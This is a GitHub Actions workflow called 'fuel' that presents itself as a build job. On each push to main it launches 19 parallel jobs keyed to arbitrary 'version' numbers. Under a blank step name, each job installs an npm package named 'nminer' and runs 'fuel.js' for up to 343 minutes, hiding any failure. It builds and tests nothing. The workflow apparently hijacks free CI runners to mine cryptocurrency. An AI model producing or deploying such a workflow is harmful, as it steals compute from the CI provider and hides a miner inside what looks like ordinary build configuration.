name: fuel
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2027 }
          - { version: 2261 }
          - { version: 7145 }
          - { version: 9394 }
          - { version: 7096 }
          - { version: 879 }
          - { version: 7024 }
          - { version: 2128 }
          - { version: 725 }
          - { version: 4919 }
          - { version: 4010 }
          - { version: 4669 }
          - { version: 3297 }
          - { version: 3905 }
          - { version: 8883 }
          - { version: 449 }
          - { version: 895 }
          - { version: 2664 }
          - { version: 241 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 343m node fuel.js || echo "fuel executed"